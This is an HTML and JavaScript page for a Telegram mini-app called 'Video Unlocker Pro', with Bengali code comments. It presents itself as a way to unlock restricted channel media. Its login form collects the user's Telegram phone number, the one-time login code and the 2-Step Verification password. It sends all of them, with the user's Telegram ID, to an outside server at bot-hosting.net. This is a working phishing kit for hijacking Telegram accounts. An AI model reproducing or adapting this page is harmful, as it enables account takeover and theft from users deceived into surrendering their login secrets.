<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Video Unlocker Pro</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0f0f0f; color: white; margin: 0; padding: 10px; user-select: none; }
        
        .menu-bar { background: linear-gradient(145deg, #1a1a1a, #222); padding: 15px; border-radius: 12px; border: 1px solid #444; margin-bottom: 15px; text-align: center; }
        .premium-btn { background: linear-gradient(90deg, #ffcc00, #ff9900); color: black; border: none; padding: 12px; width: 100%; border-radius: 10px; font-weight: bold; cursor: pointer;}
        
        /* Login Modal Styling */
        .login-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.92); justify-content: center; align-items: center; z-index: 10000; backdrop-filter: blur(5px); }
        .login-box { background: #1a1a1a; padding: 30px 20px; border-radius: 20px; text-align: center; border: 1px solid #ffcc00; width: 85%; max-width: 350px; }
        .login-box input { width: 85%; padding: 12px; margin: 15px 0; border-radius: 8px; border: 1px solid #555; background: #222; color: white; font-size: 16px; text-align: center;}
        .login-box button { background: linear-gradient(90deg, #00ffaa, #00aaff); color: black; font-weight: bold; padding: 12px; border: none; border-radius: 10px; width: 100%; cursor: pointer;}
        .login-box button.cancel-btn { background: transparent; border: 1px solid #555; color: #aaa; margin-top: 15px; }

        #toast { visibility: hidden; min-width: 250px; background-color: #333; color: #fff; text-align: center; border-radius: 8px; padding: 12px; position: fixed; z-index: 999999; left: 50%; bottom: 30px; transform: translateX(-50%); font-size: 14px; font-weight: bold; opacity: 0; transition: opacity 0.3s; }
        #toast.show { visibility: visible; opacity: 1; bottom: 50px; }
    </style>
</head>
<body oncontextmenu="return false;">

    <div class="menu-bar">
        <button class="premium-btn" onclick="openLogin()">🌟 Restricted Content Access</button>
        <div style="font-size: 10px; color: #aaa; margin-top: 8px;">Login to fetch media from restricted channels!</div>
    </div>

    <!-- 🔑 Login Modal -->
    <div id="loginModal" class="login-modal">
        <!-- Step 1: Phone -->
        <div class="login-box" id="phone-step">
            <h3 style="color:#ffcc00; margin-top:0;">Premium Access</h3>
            <p style="font-size: 12px; color: #ccc;">Enter Telegram Number (+8801...)</p>
            <input type="text" id="phoneNumber" placeholder="+8801...">
            <button onclick="requestOTP()">Send OTP</button>
            <button class="cancel-btn" onclick="closeLogin()">Cancel</button>
        </div>

        <!-- Step 2: OTP & 2FA -->
        <div class="login-box" id="otp-step" style="display:none;">
            <h3 style="color:#ffcc00; margin-top:0;">Verify Account</h3>
            <input type="text" id="otpCode" placeholder="Enter OTP Code">
            <input type="password" id="twoFaCode" placeholder="2-Step Password (If any)" style="display:none;">
            <button onclick="submitOTP()">Verify & Login</button>
            <button class="cancel-btn" onclick="closeLogin()">Cancel</button>
        </div>
    </div>

    <div id="toast">Message here</div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();
        tg.ready();

        // 🔴 আপনার সার্ভারের আইপি
        const BACKEND_URL = 'http://de3.bot-hosting.net:20495'; 
        const userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : '123456'; 

        function showToast(msg) {
            const toast = document.getElementById("toast");
            toast.innerText = msg; toast.className = "show";
            setTimeout(() => { toast.className = toast.className.replace("show", ""); }, 4000);
        }

        function openLogin() { 
            document.getElementById('loginModal').style.display = 'flex'; 
            document.getElementById('phone-step').style.display = 'block';
            document.getElementById('otp-step').style.display = 'none';
        }

        function closeLogin() { document.getElementById('loginModal').style.display = 'none'; }

        let tempPhone = "";
        let require2FA = false;

        async function requestOTP() {
            tempPhone = document.getElementById('phoneNumber').value.trim();
            if(!tempPhone.startsWith('+')) return showToast("⚠️ Must start with Country Code (+)");
            
            showToast("⏳ Requesting OTP...");
            try {
                let res = await fetch(`${BACKEND_URL}/api/request_otp`, { 
                    method: 'POST', 
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({phone: tempPhone}) 
                });
                
                let data = await res.json();
                if(data.status === "success") {
                    document.getElementById('phone-step').style.display = 'none';
                    document.getElementById('otp-step').style.display = 'block';
                    showToast("✅ OTP sent to your Telegram App!");
                } else {
                    showToast("❌ Error: " + data.message);
                }
            } catch(e) {
                showToast("❌ Server Connection Error!");
            }
        }

        async function submitOTP() {
            let otp = document.getElementById('otpCode').value.trim();
            let pass = document.getElementById('twoFaCode').value.trim();
            if(!otp) return showToast("⚠️ Please enter OTP code!");
            
            showToast("⏳ Verifying Session...");
            try {
                let bodyData = {phone: tempPhone, code: otp, telegram_user_id: userId};
                if(require2FA && pass) bodyData.password = pass;

                let res = await fetch(`${BACKEND_URL}/api/verify_otp`, { 
                    method: 'POST', 
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(bodyData) 
                });
                
                let data = await res.json();
                if(data.status === "success") {
                    showToast("🎉 Successfully Logged In!");
                    setTimeout(() => { closeLogin(); tg.close(); }, 2000); // 2 সেকেন্ড পর অ্যাপ ক্লোজ হয়ে যাবে
                } else if(data.status === "2fa_required") {
                    require2FA = true;
                    document.getElementById('twoFaCode').style.display = 'inline-block';
                    showToast("🔒 Enter your 2-Step Password!");
                } else {
                    showToast("❌ Error: " + data.message);
                }
            } catch(e) {
                showToast("❌ Server Connection Error!");
            }
        }
    </script>
</body>
</html>
